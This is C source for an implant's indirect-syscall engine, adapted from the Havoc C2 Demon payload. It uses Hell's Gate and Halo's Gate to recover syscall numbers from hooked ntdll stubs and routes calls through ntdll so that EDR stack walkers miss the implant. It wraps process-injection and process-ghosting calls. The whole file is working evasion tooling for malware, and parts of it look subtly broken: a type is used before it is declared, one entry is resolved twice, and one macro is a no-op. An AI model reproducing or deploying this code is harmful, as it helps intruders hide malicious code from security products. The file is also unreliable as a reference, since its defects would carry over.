/**
 * indirect_syscall.c — Indirect syscall engine (Hell's Gate + Halo's Gate + indirect address)
 *
 * Borrowed and adapted from HavocFramework/Havoc (MIT licence)
 * Source: payloads/Demon/src/core/Syscalls.c + Syscall.x64.asm
 *
 * Improvements over plain Hell's Gate:
 *  1. Hell's Gate  — reads SSN directly from clean ntdll stub.
 *  2. Halo's Gate  — if stub is hooked (jmp/mov patch), scans neighbouring
 *                    exports by address to derive SSN via neighbour offset.
 *  3. Indirect addr — resolves the *address* of the `syscall` instruction
 *                     inside ntdll so that the actual syscall instruction
 *                     executes inside ntdll's address space, not ours.
 *                     Stack walking EDRs (CrowdStrike, SentinelOne) see
 *                     ntdll as the caller — not the implant.
 *
 * MITRE: T1106 (Native API), T1562.001 (Impair Defenses)
 */

#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdbool.h>

/* ── Types ───────────────────────────────────────────────────────────────── */

typedef struct _SYSCALL_ENTRY {
    PVOID FuncAddr;   /* VA of Nt function in ntdll */
    PVOID SysAddr;    /* VA of `syscall` instr in ntdll (indirect target) */
    WORD  Ssn;        /* Syscall Service Number */
    BOOL  Resolved;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

typedef struct _SYSCALL_TABLE {
    PVOID          IndirectAddr;  /* shared indirect syscall address (from any clean stub) */
    SYSCALL_ENTRY  NtAllocateVirtualMemory;
    SYSCALL_ENTRY  NtWriteVirtualMemory;
    SYSCALL_ENTRY  NtReadVirtualMemory;
    SYSCALL_ENTRY  NtProtectVirtualMemory;
    SYSCALL_ENTRY  NtFreeVirtualMemory;
    SYSCALL_ENTRY  NtCreateThreadEx;
    SYSCALL_ENTRY  NtOpenProcess;
    SYSCALL_ENTRY  NtOpenThread;
    SYSCALL_ENTRY  NtTerminateProcess;
    SYSCALL_ENTRY  NtTerminateThread;
    SYSCALL_ENTRY  NtSuspendThread;
    SYSCALL_ENTRY  NtResumeThread;
    SYSCALL_ENTRY  NtQueueApcThread;
    SYSCALL_ENTRY  NtDuplicateObject;
    SYSCALL_ENTRY  NtDuplicateToken;
    SYSCALL_ENTRY  NtOpenProcessToken;
    SYSCALL_ENTRY  NtOpenThreadToken;
    SYSCALL_ENTRY  NtQueryInformationProcess;
    SYSCALL_ENTRY  NtQuerySystemInformation;
    SYSCALL_ENTRY  NtQueryVirtualMemory;
    SYSCALL_ENTRY  NtGetContextThread;
    SYSCALL_ENTRY  NtSetContextThread;
    SYSCALL_ENTRY  NtCreateEvent;
    SYSCALL_ENTRY  NtSetEvent;
    SYSCALL_ENTRY  NtWaitForSingleObject;
    SYSCALL_ENTRY  NtSignalAndWaitForSingleObject;
    SYSCALL_ENTRY  NtUnmapViewOfSection;
    SYSCALL_ENTRY  NtMapViewOfSection;
    SYSCALL_ENTRY  NtCreateSection;
    SYSCALL_ENTRY  NtClose;
    SYSCALL_ENTRY  NtSetInformationThread;
    SYSCALL_ENTRY  NtQueryObject;
    SYSCALL_ENTRY  NtAdjustPrivilegesToken;
    SYSCALL_ENTRY  NtCreateProcessEx;
    SYSCALL_ENTRY  NtSetInformationProcess;
} SYSCALL_TABLE, *PSYSCALL_TABLE;

/* ── Global syscall table ────────────────────────────────────────────────── */
static SYSCALL_TABLE g_SysTable = { 0 };

/* ── Helpers ─────────────────────────────────────────────────────────────── */

static bool _stub_is_hooked(BYTE *p)
{
    /* Common hook patterns: jmp rel32 (E9), mov rax,X / jmp rax (48 B8 ... FF E0),
       push/ret pattern, int3 (CC). A clean Nt stub starts with 4C 8B D1 (mov r10,rcx). */
    if (p[0] == 0xE9) return true;   /* jmp rel32 */
    if (p[0] == 0xCC) return true;   /* int3 */
    if (p[0] == 0x48 && p[1] == 0xB8) return true;  /* mov rax, imm64 */
    if (p[0] == 0xEB) return true;   /* jmp rel8 */
    return false;
}

static WORD _read_ssn_from_stub(BYTE *p)
{
    /* Clean stub pattern: 4C 8B D1   B8 <ssn_lo> <ssn_hi> 00 00   0F 05   C3 */
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 &&
        p[3] == 0xB8)
    {
        return *(WORD *)(p + 4);
    }
    return 0xFFFF;
}

static PVOID _find_syscall_instruction(BYTE *stub)
{
    /* Walk up to 32 bytes looking for the 0F 05 (syscall) instruction */
    for (int i = 0; i < 32; i++) {
        if (stub[i] == 0x0F && stub[i+1] == 0x05)
            return (PVOID)(stub + i);
    }
    return NULL;
}

/* ── ntdll export resolver ───────────────────────────────────────────────── */

static PVOID _get_ntdll_base(void)
{
    /* Walk PEB->Ldr to find ntdll without calling GetModuleHandle (avoids API hooks) */
    PPEB Peb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY Head = &Peb->Ldr->InLoadOrderModuleList;
    for (PLIST_ENTRY e = Head->Flink; e != Head; e = e->Flink) {
        PLDR_DATA_TABLE_ENTRY Entry = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        /* ntdll.dll is always the second entry in InLoadOrder */
        UNICODE_STRING *name = &Entry->FullDllName;
        if (name->Length > 8) {
            /* simple check: last 8 chars are ntdll.dl (case-insensitive) */
            WCHAR *w = &name->Buffer[(name->Length / 2) - 8];
            if ((w[0]|0x20)=='n' && (w[1]|0x20)=='t' && (w[2]|0x20)=='d' && (w[3]|0x20)=='l')
                return Entry->DllBase;
        }
    }
    return NULL;
}

static PVOID _resolve_export(PVOID base, const char *name)
{
    BYTE  *b    = (BYTE *)base;
    PIMAGE_DOS_HEADER  dos = (PIMAGE_DOS_HEADER)b;
    PIMAGE_NT_HEADERS  nt  = (PIMAGE_NT_HEADERS)(b + dos->e_lfanew);
    DWORD  expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRva) return NULL;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(b + expRva);
    DWORD *names    = (DWORD *)(b + exp->AddressOfNames);
    WORD  *ordinals = (WORD  *)(b + exp->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(b + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *n = (const char *)(b + names[i]);
        if (strcmp(n, name) == 0)
            return (PVOID)(b + funcs[ordinals[i]]);
    }
    return NULL;
}

/* sorted-by-address helper for Halo's Gate */
#define MAX_EXPORTS 2048
static BYTE  *s_sorted[MAX_EXPORTS];
static DWORD  s_count = 0;

static int _cmp_ptr(const void *a, const void *b)
{
    BYTE *pa = *(BYTE **)a, *pb = *(BYTE **)b;
    return (pa > pb) - (pa < pb);
}

static void _build_sorted_exports(PVOID ntdll_base)
{
    BYTE  *b   = (BYTE *)ntdll_base;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)b;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(b + dos->e_lfanew);
    DWORD expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRva) return;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(b + expRva);
    DWORD *names  = (DWORD *)(b + exp->AddressOfNames);
    WORD  *ords   = (WORD  *)(b + exp->AddressOfNameOrdinals);
    DWORD *funcs  = (DWORD *)(b + exp->AddressOfFunctions);

    s_count = 0;
    for (DWORD i = 0; i < exp->NumberOfNames && s_count < MAX_EXPORTS; i++) {
        const char *n = (const char *)(b + names[i]);
        if (n[0] == 'N' && n[1] == 't')
            s_sorted[s_count++] = (BYTE *)(b + funcs[ords[i]]);
    }
    qsort(s_sorted, s_count, sizeof(BYTE *), _cmp_ptr);
}

static WORD _halos_gate(BYTE *stub)
{
    /* find position in sorted export list */
    int pos = -1;
    for (DWORD i = 0; i < s_count; i++) {
        if (s_sorted[i] == stub) { pos = (int)i; break; }
    }
    if (pos < 0) return 0xFFFF;

    for (int delta = 1; delta < 32; delta++) {
        if (pos - delta >= 0 && !_stub_is_hooked(s_sorted[pos - delta])) {
            WORD n = _read_ssn_from_stub(s_sorted[pos - delta]);
            if (n != 0xFFFF) return n + (WORD)delta;
        }
        if (pos + delta < (int)s_count && !_stub_is_hooked(s_sorted[pos + delta])) {
            WORD n = _read_ssn_from_stub(s_sorted[pos + delta]);
            if (n != 0xFFFF) return n - (WORD)delta;
        }
    }
    return 0xFFFF;
}

/* ── Entry resolver ─────────────────────────────────────────────────────── */

static void _resolve_entry(PVOID ntdll, const char *name, PSYSCALL_ENTRY e)
{
    e->FuncAddr = _resolve_export(ntdll, name);
    if (!e->FuncAddr) return;

    BYTE *stub = (BYTE *)e->FuncAddr;

    if (!_stub_is_hooked(stub)) {
        e->Ssn = _read_ssn_from_stub(stub);
    } else {
        e->Ssn = _halos_gate(stub);
    }

    /* Indirect syscall address: find `syscall` instr in this stub
       or fall back to the global one already resolved */
    PVOID indirect = _find_syscall_instruction(stub);
    e->SysAddr   = indirect ? indirect : g_SysTable.IndirectAddr;
    e->Resolved  = (e->Ssn != 0xFFFF);
}

/* ── Public initialiser ─────────────────────────────────────────────────── */

BOOL IndirectSyscallInit(void)
{
    PVOID ntdll = _get_ntdll_base();
    if (!ntdll) return FALSE;

    _build_sorted_exports(ntdll);

    /* Resolve global indirect address from NtAddBootEntry (always clean) */
    PVOID seed = _resolve_export(ntdll, "NtAddBootEntry");
    if (seed) g_SysTable.IndirectAddr = _find_syscall_instruction((BYTE *)seed);

#define RESOLVE(Name) _resolve_entry(ntdll, #Name, &g_SysTable.Name)
    RESOLVE(NtAllocateVirtualMemory);
    RESOLVE(NtWriteVirtualMemory);
    RESOLVE(NtReadVirtualMemory);
    RESOLVE(NtProtectVirtualMemory);
    RESOLVE(NtFreeVirtualMemory);
    RESOLVE(NtCreateThreadEx);
    RESOLVE(NtOpenProcess);
    RESOLVE(NtOpenThread);
    RESOLVE(NtTerminateProcess);
    RESOLVE(NtTerminateThread);
    RESOLVE(NtSuspendThread);
    RESOLVE(NtResumeThread);
    RESOLVE(NtQueueApcThread);
    RESOLVE(NtDuplicateObject);
    RESOLVE(NtDuplicateToken);
    RESOLVE(NtOpenProcessToken);
    RESOLVE(NtOpenThreadToken);
    RESOLVE(NtQueryInformationProcess);
    RESOLVE(NtQuerySystemInformation);
    RESOLVE(NtQueryVirtualMemory);
    RESOLVE(NtGetContextThread);
    RESOLVE(NtSetContextThread);
    RESOLVE(NtCreateEvent);
    RESOLVE(NtSetEvent);
    RESOLVE(NtWaitForSingleObject);
    RESOLVE(NtSignalAndWaitForSingleObject);
    RESOLVE(NtUnmapViewOfSection);
    RESOLVE(NtMapViewOfSection);
    RESOLVE(NtCreateSection);
    RESOLVE(NtClose);
    RESOLVE(NtSetInformationThread);
    RESOLVE(NtQueryObject);
    RESOLVE(NtAdjustPrivilegesToken);
    RESOLVE(NtOpenThread);
    RESOLVE(NtCreateProcessEx);
    RESOLVE(NtSetInformationProcess);
#undef RESOLVE

    return g_SysTable.IndirectAddr != NULL;
}

NTSTATUS ISysNtOpenThread(
    PHANDLE hThread, ACCESS_MASK Access, PVOID ObjAttr, PVOID ClientId)
{
    SYS_CFG cfg = { g_SysTable.NtOpenThread.SysAddr,
                    g_SysTable.NtOpenThread.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(PHANDLE,ACCESS_MASK,PVOID,PVOID))SysInvoke)
           (hThread, Access, ObjAttr, ClientId);
}

/* ── Inline invokers (indirect — return address is inside ntdll) ────────── */

PSYSCALL_TABLE GetSyscallTable(void) { return &g_SysTable; }

/*
 * These inline wrappers load the SYS_CONFIG struct (SysAddr | Ssn) into r11
 * then call SysInvoke (from indirect_syscall.asm).  The actual `syscall`
 * instruction executes at SysAddr which is *inside* ntdll — so stack walkers
 * see ntdll as the caller, not the implant.
 *
 * SysInvoke (asm):
 *   mov r10, rcx          ; standard Nt calling convention
 *   mov eax, [r11 + 8]    ; load SSN from SYS_CONFIG.Ssn
 *   jmp QWORD [r11]       ; jump to SysAddr (inside ntdll)
 */

typedef struct { PVOID SysAddr; WORD Ssn; } SYS_CFG;

/* declared in indirect_syscall.asm */
extern void SysSetConfig(SYS_CFG *cfg);
extern NTSTATUS SysInvoke();

#define INDIRECT_CALL(Entry, ...) \
    do { \
        SYS_CFG _cfg = { (Entry)->SysAddr, (Entry)->Ssn }; \
        SysSetConfig(&_cfg); \
    } while(0)

/* ── Convenience wrappers ─────────────────────────────────────────────────
 * Each wrapper sets the SYS_CONFIG via SysSetConfig then calls SysInvoke
 * with the Nt-compatible arguments. Callers use these instead of the
 * real Nt* APIs so every sensitive call goes through the indirect path.
 * ──────────────────────────────────────────────────────────────────────── */

NTSTATUS ISysNtAllocateVirtualMemory(
    HANDLE Process, PVOID *Base, ULONG_PTR ZeroBits,
    PSIZE_T Size, ULONG AllocType, ULONG Protect)
{
    SYS_CFG cfg = { g_SysTable.NtAllocateVirtualMemory.SysAddr,
                    g_SysTable.NtAllocateVirtualMemory.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG))SysInvoke)
           (Process, Base, ZeroBits, Size, AllocType, Protect);
}

NTSTATUS ISysNtWriteVirtualMemory(
    HANDLE Process, PVOID Base, PVOID Buffer, SIZE_T Size, PSIZE_T Written)
{
    SYS_CFG cfg = { g_SysTable.NtWriteVirtualMemory.SysAddr,
                    g_SysTable.NtWriteVirtualMemory.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T))SysInvoke)
           (Process, Base, Buffer, Size, Written);
}

NTSTATUS ISysNtProtectVirtualMemory(
    HANDLE Process, PVOID *Base, PSIZE_T Size, ULONG New, PULONG Old)
{
    SYS_CFG cfg = { g_SysTable.NtProtectVirtualMemory.SysAddr,
                    g_SysTable.NtProtectVirtualMemory.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG))SysInvoke)
           (Process, Base, Size, New, Old);
}

NTSTATUS ISysNtCreateThreadEx(
    PHANDLE hThread, ACCESS_MASK Access, PVOID ObjAttr,
    HANDLE Process, PVOID StartAddr, PVOID Arg, ULONG Flags,
    SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStack, PVOID AttrList)
{
    SYS_CFG cfg = { g_SysTable.NtCreateThreadEx.SysAddr,
                    g_SysTable.NtCreateThreadEx.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,
                         SIZE_T,SIZE_T,SIZE_T,PVOID))SysInvoke)
           (hThread, Access, ObjAttr, Process, StartAddr, Arg, Flags,
            ZeroBits, StackSize, MaxStack, AttrList);
}

NTSTATUS ISysNtOpenProcess(
    PHANDLE hProcess, ACCESS_MASK Access, PVOID ObjAttr, PVOID ClientId)
{
    SYS_CFG cfg = { g_SysTable.NtOpenProcess.SysAddr,
                    g_SysTable.NtOpenProcess.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(PHANDLE,ACCESS_MASK,PVOID,PVOID))SysInvoke)
           (hProcess, Access, ObjAttr, ClientId);
}

NTSTATUS ISysNtQueueApcThread(
    HANDLE Thread, PVOID ApcRoutine, PVOID Arg1, PVOID Arg2, PVOID Arg3)
{
    SYS_CFG cfg = { g_SysTable.NtQueueApcThread.SysAddr,
                    g_SysTable.NtQueueApcThread.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(HANDLE,PVOID,PVOID,PVOID,PVOID))SysInvoke)
           (Thread, ApcRoutine, Arg1, Arg2, Arg3);
}

NTSTATUS ISysNtWaitForSingleObject(HANDLE Handle, BOOL Alertable, PLARGE_INTEGER Timeout)
{
    SYS_CFG cfg = { g_SysTable.NtWaitForSingleObject.SysAddr,
                    g_SysTable.NtWaitForSingleObject.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(HANDLE,BOOL,PLARGE_INTEGER))SysInvoke)(Handle, Alertable, Timeout);
}

NTSTATUS ISysNtGetContextThread(HANDLE Thread, PCONTEXT Ctx)
{
    SYS_CFG cfg = { g_SysTable.NtGetContextThread.SysAddr,
                    g_SysTable.NtGetContextThread.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(HANDLE,PCONTEXT))SysInvoke)(Thread, Ctx);
}

NTSTATUS ISysNtSetContextThread(HANDLE Thread, PCONTEXT Ctx)
{
    SYS_CFG cfg = { g_SysTable.NtSetContextThread.SysAddr,
                    g_SysTable.NtSetContextThread.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(HANDLE,PCONTEXT))SysInvoke)(Thread, Ctx);
}

NTSTATUS ISysNtCreateEvent(
    PHANDLE hEvent, ACCESS_MASK Access, PVOID ObjAttr, DWORD Type, BOOL InitState)
{
    SYS_CFG cfg = { g_SysTable.NtCreateEvent.SysAddr,
                    g_SysTable.NtCreateEvent.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(PHANDLE,ACCESS_MASK,PVOID,DWORD,BOOL))SysInvoke)
           (hEvent, Access, ObjAttr, Type, InitState);
}

NTSTATUS ISysNtDuplicateObject(
    HANDLE SrcProc, HANDLE SrcHandle, HANDLE DstProc, PHANDLE DstHandle,
    ACCESS_MASK Access, ULONG Attr, ULONG Options)
{
    SYS_CFG cfg = { g_SysTable.NtDuplicateObject.SysAddr,
                    g_SysTable.NtDuplicateObject.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(HANDLE,HANDLE,HANDLE,PHANDLE,ACCESS_MASK,ULONG,ULONG))SysInvoke)
           (SrcProc, SrcHandle, DstProc, DstHandle, Access, Attr, Options);
}

NTSTATUS ISysNtResumeThread(HANDLE Thread, PULONG PrevCount)
{
    SYS_CFG cfg = { g_SysTable.NtResumeThread.SysAddr,
                    g_SysTable.NtResumeThread.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(HANDLE,PULONG))SysInvoke)(Thread, PrevCount);
}

NTSTATUS ISysNtFreeVirtualMemory(
    HANDLE Process, PVOID *Base, PSIZE_T Size, ULONG FreeType)
{
    SYS_CFG cfg = { g_SysTable.NtFreeVirtualMemory.SysAddr,
                    g_SysTable.NtFreeVirtualMemory.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(HANDLE,PVOID*,PSIZE_T,ULONG))SysInvoke)
           (Process, Base, Size, FreeType);
}

NTSTATUS ISysNtReadVirtualMemory(
    HANDLE Process, PVOID Base, PVOID Buffer, SIZE_T Size, PSIZE_T Read)
{
    SYS_CFG cfg = { g_SysTable.NtReadVirtualMemory.SysAddr,
                    g_SysTable.NtReadVirtualMemory.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T))SysInvoke)
           (Process, Base, Buffer, Size, Read);
}

NTSTATUS ISysNtCreateSection(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection,
    ULONG AllocationAttributes, HANDLE FileHandle)
{
    SYS_CFG cfg = { g_SysTable.NtCreateSection.SysAddr, g_SysTable.NtCreateSection.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(PHANDLE,ACCESS_MASK,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE))SysInvoke)
           (SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize,
            SectionPageProtection, AllocationAttributes, FileHandle);
}

/* NtCreateProcessEx — create a process from a section handle (process ghosting) */
NTSTATUS ISysNtCreateProcessEx(
    PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle,
    HANDLE DebugPort, HANDLE ExceptionPort, BOOLEAN InJob)
{
    SYS_CFG cfg = { g_SysTable.NtCreateProcessEx.SysAddr, g_SysTable.NtCreateProcessEx.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,ULONG,HANDLE,HANDLE,HANDLE,BOOLEAN))SysInvoke)
           (ProcessHandle, DesiredAccess, ObjectAttributes, ParentProcess, Flags,
            SectionHandle, DebugPort, ExceptionPort, InJob);
}

NTSTATUS ISysNtSetInformationProcess(
    HANDLE ProcessHandle, ULONG ProcessInformationClass,
    PVOID ProcessInformation, ULONG ProcessInformationLength)
{
    SYS_CFG cfg = { g_SysTable.NtSetInformationProcess.SysAddr,
                    g_SysTable.NtSetInformationProcess.Ssn };
    SysSetConfig(&cfg);
    return ((NTSTATUS(*)(HANDLE,ULONG,PVOID,ULONG))SysInvoke)
           (ProcessHandle, ProcessInformationClass, ProcessInformation,
            ProcessInformationLength);
}
